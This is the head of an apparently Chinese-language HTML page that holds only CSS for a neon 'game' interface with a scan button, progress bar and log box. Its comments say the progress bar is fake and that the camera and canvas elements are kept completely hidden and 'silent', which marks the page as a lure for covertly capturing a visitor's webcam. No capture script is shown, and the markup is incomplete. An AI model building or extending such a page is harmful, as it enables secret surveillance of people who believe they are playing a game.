<html lang="zh-CN">
<head>

        body {
            margin: 0;
            padding: 0;

            background-color: #0a0e17;
            color: #00ffcc;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
        }
        
        .game-box {
            text-align: center;
            padding: 30px;
            max-width: 400px;
            border: 1px solid #00ffcc;
            background: rgba(0, 255, 204, 0.03);
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
            position: relative;
        }

        h1 { 
            font-size: 24px;
            margin-bottom: 20px; 
            text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
            letter-spacing: 2px;
        }

        p { color: #88a0b0; font-size: 14px; line-height: 1.6; }

        /* 虚假的游戏进度条样式 */
        .progress-container {
            width: 100%;
            background-color: #112233;
            border: 1px solid #00ffcc;
            height: 20px;
            margin-top: 25px;
            border-radius: 10px;
            overflow: hidden;
            display: none;
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background-color: #00ffcc;
            box-shadow: 0 0 10px #00ffcc;
            transition: width 0.1s linear;
        }

        .btn-scan {
            background-color: transparent;
            color: #00ffcc;
            border: 2px solid #00ffcc;
            padding: 14px 30px;
            font-size: 16px;
            border-radius: 30px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 25px;
            letter-spacing: 1px;
            box-shadow: 0 0 15px rgba(0, 255, 204, 0.3);
            transition: all 0.3s ease;
        }

        .btn-scan:hover {
            background-color: #00ffcc;
            color: #0a0e17;
            box-shadow: 0 0 25px #00ffcc;
        }

        .log-box {
            margin-top: 20px;
            font-size: 12px;
            color: #00aa88;
            min-height: 40px;
            text-align: left;
            border-top: 1px dashed #334455;
            padding-top: 10px;
        }

        /* 🔒 核心：摄像头和画布依然彻底隐藏，保持静默状态 */
        video, canvas { display: none !important; }
    </style>
</head>
